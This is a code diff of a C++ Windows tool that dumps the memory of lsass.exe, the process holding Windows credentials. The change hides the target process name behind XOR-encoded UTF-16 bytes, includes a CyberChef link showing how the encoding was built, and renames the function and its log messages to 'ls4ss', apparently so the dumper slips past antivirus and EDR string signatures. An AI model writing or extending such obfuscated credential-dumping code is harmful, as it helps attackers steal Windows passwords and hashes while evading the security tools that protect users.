@@ -75,19 +75,25 @@ void deconditioning(unsigned int deconDumps) {
 }
 
 
-void dump_lsass() {
-    DWORD lsassPid = ProcessCache::GetPid(L"lsass.exe");
-    if (lsassPid != 0) {
-		std::cout << "Dumping lsass.exe with pid " << lsassPid << std::endl;
-        if (dump_process(lsassPid)) {
-            std::cout << "  lsass.exe dumped successfully with pid " << lsassPid << std::endl;
+void dump_ls4ss() {
+    // ls4ss.exe
+    // https://cyberchef.org/#recipe=Unescape_string()Encode_text('UTF-16LE%20(1200)')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=bHNhc3MuZXhlXDA
+    BYTE procBytes[] = { 0x2d,0x42,0x32,0x42,0x20,0x42,0x32,0x42,0x32,0x42,0x6f,0x42,0x24,0x42,0x39,0x42,0x24,0x42,0x41,0x42 };
+    for (size_t i = 0; i < sizeof(procBytes); ++i) { procBytes[i] ^= ((i & 1) == 0 ? 0x41 : 0x42); }
+    wchar_t* procW = reinterpret_cast<wchar_t*>(procBytes);
+
+    DWORD lsa4sPid = ProcessCache::GetPid(procW);
+    if (lsa4sPid != 0) {
+		std::cout << "Dumping ls4ss.exe with pid " << lsa4sPid << std::endl;
+        if (dump_process(lsa4sPid)) {
+            std::cout << "  ls4ss.exe dumped successfully with pid " << lsa4sPid << std::endl;
         }
         else {
-            std::cerr << "  Failed to dump lsass.exe with pid " << lsassPid << std::endl;
+            std::cerr << "  Failed to dump ls4ss.exe with pid " << lsa4sPid << std::endl;
         }
     }
     else {
-        std::cerr << "  lsass.exe not found\n";
+        std::cerr << "  ls4ss.exe not found\n";
     }
 }
 
@@ -100,7 +106,7 @@ int main(int argc, char* argv[]) {
     
     if (argc > 1 && argv[1][0] == '1') {
 		std::cout << "Dumping target\n";
-        dump_lsass();
+        dump_ls4ss();
     }
     else {
         std::cout << "Didnt dump target\n";
